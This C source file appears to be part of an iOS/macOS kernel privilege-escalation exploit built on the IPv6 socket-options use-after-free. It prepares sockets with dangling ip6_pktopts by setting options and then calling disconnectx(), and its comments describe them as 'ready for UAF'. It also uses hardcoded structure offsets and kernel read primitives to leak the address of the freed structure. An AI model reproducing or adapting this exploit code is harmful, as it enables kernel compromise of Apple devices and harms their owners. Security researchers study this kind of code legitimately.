#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>

#include "socket.h"
#include "helper.h"
#include "krw.h"
#include "find_port.h"

int get_socket() {
    int sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        printf("[-] Can't get socket, error %d (%s)\n", errno, strerror(errno));
        return -1;
    }
    
    // allow setsockopt() after disconnect()
    struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT};
    int ret = setsockopt(sock, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
    if (ret) {
        printf("[-] setsockopt() failed, error %d (%s)\n", errno, strerror(errno));
        return -1;
    }
    
    return sock;
}

// utilities to manipulate sockets
int set_minmtu(int sock, int *minmtu) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, sizeof(*minmtu));
}

// free the pktopts struct of the socket to get ready for UAF
int free_socket_options(int sock) {
    return disconnectx(sock, 0, 0);
}

// return a socket ready for UAF
int get_socket_with_dangling_options() {
    int socket = get_socket();
    
    int minmtu = -1;
    set_minmtu(socket, &minmtu);
    
    free_socket_options(socket);
    
    return socket;
}

int get_minmtu(int sock, int *minmtu) {
    socklen_t size = sizeof(*minmtu);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
}

int get_prefertempaddr(int sock, int *prefertempaddr) {
    socklen_t size = sizeof(*prefertempaddr);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, &size);
}

int get_pktinfo(int sock, struct in6_pktinfo *pktinfo) {
    socklen_t size = sizeof(*pktinfo);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, &size);
}

int set_pktinfo(int sock, struct in6_pktinfo *pktinfo) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(*pktinfo));
}

uint64_t get_dangling_ip6_pktopts_kaddr(int socket_fd) {

    uint32_t off_p_fd = 0xe8;   // p/x offsetof(struct proc, p_fd)
    uint32_t off_fp_glob = 0x8; // p/x offsetof(struct fileproc, f_fglob)
    uint32_t off_fg_data = 0x38;    // p/x offsetof(struct fileglob, fg_data)
    uint32_t off_so_pcb = 0x10; // p/x offsetof(struct socket, so_pcb)
    uint32_t off_inp6_outputopts = 0x130;   // p/x offsetof(struct inpcb, inp_depend6.inp6_outputopts)


    uint64_t ourproc = proc_of_pid(getpid());
    uint64_t filedesc_ptr = kread64(ourproc + off_p_fd);
    uint64_t filedesc = kread64(filedesc_ptr);
    uint64_t openedfile = kread64(filedesc + (8 * socket_fd));
    uint64_t fileglob = kread64(openedfile + off_fp_glob);
    uint64_t socket = kread64(fileglob + off_fg_data);

    uint64_t inpcb = kread64(socket + off_so_pcb);
    uint64_t ip6_pktopts = kread64(inpcb + off_inp6_outputopts);
    
    return (ip6_pktopts);
}